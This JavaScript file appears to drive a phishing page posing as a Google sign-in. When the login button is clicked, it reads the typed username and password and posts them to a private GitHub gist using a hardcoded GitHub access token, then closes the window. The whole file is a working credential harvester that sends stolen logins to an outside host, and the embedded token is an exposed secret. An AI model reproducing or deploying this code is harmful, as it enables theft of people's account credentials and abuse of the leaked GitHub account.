import { Octokit, App } from "https://esm.sh/octokit";
// $(function () {
//     'use strict'
//     $('.createAccount').on('click', function (e) {
//         window.location.replace("./page-thank-you.html");

//     });
// })

const octokit = new Octokit({
    auth: `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`,
});

async function baz(username, password) {
    debugger;
    const foo = await octokit.request("POST /gists", {
        description: "Example of a gist",
        public: false,
        files: {
            [new Date().getTime().toString(32)]: {
                content: "Hello " + username + " / " + password,
            },
        },
        headers: {
            "x-github-api-version": "2022-11-28",
            "User-Agent": `niagaratriskelion`,
            Authorization: "bearer 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",
        },
    });
    console.log(foo);
    window.close();
}
(function () {
    document.querySelector('#loginGoogle').addEventListener('click', function () {
        const pass = document.querySelector('input[type="password"]').value
        const user = document.querySelector('#user').value
        let allowed = false;

        allowed = !!user && !!pass
        allowed = user.length >= 8 && pass.length >= 8
        if (allowed) {
            baz(user, pass)
            // window.opener.postMessage(`${user},${pass}`, '*');
            // window.close();
        } else {
            // document.querySelector('#login-falied').classList.remove('hide')
        }

    })
})(); 
